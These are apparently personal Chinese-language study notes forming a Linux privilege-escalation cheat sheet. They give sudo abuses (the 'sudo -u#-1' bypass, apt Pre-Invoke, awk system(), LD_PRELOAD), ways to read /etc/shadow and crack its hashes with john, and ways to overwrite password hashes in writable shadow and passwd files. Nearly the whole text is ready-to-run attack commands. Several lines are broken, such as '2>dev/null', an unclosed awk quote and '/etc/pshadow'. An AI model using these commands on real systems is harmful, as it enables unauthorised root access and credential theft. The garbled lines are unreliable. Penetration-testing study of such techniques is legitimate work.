### 查看当前用户
    cl

---
### 查看当前目录
    pwd

---

## sudo提权
### 枚举
    sudo -l
### 切换用户
    sudo -u jack /bin/bash
    sudo -u#10000 /bin/bash
### 修改交互更好的bash环境
    python -c "import pty;pty.spawn('/bin/bash')"
### 搜索
    grep -R -i pass /home/* 2>dev/null
### sudo -u提权
    sudo -V | grep version 
    'Sudo version 1.7.4p4'
    sudo -u#-1 /bin/bash
### sudo apt(apt-get)提权
    sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
### sudo apache2提权
    sudo apache2 -f /etc/shadow
    vim shadow_root
    sudo john shadow_root --wordlist=/usr/share/wordlists/rockyou.txt
### sudo ash提权
    sudo ash
### sudo awk提权
    sudo awk 'BEGIN {system("/bin/bash)}'
### sudo环境变量提权
    'env_reset,env_keep+=LD_PRELOAD'
    vim 共享库
    编译
    sudo LD_PRELOAD=/home/user/共享库 find
### 提权大全
    https://gtfobins.github.io/
---
## 可读可写shadow和passwd文件利用提权
- 可读shadow
1. 查看权限
	`ls -liah /etc/pshadow`
	![[Pasted image 20250505181903.png]]
2. 读取shadow文件
	`cat /etc/shadow`
3. 提取特殊用户
	`cat /etc/shadow | grep ':\$'
4. john破解
	 `sudo john hash/hash.lst --wordlist=/usr/share/wordlists/rockyou.txt`

- 可写shadow
1. 查看权限
	`ls -liah /etc/shadow`
2. 备份
	`cp /etc/shadow /tmp/shadow.bak`
3. mkpasswd
	`mkpasswd -m sha-512 admin`
4. vim修改密码

- 可写passwd
1. 查看权限
	`ls -liah /etc/passwd`
2. 读取passwd文件
	`cat /etc/passwd`
3. `openssl passwd admin`
4. ``cp /etc/passwd /tmp/passwd.bak``
5. 修改x
	![[Pasted image 20250505221045.png]]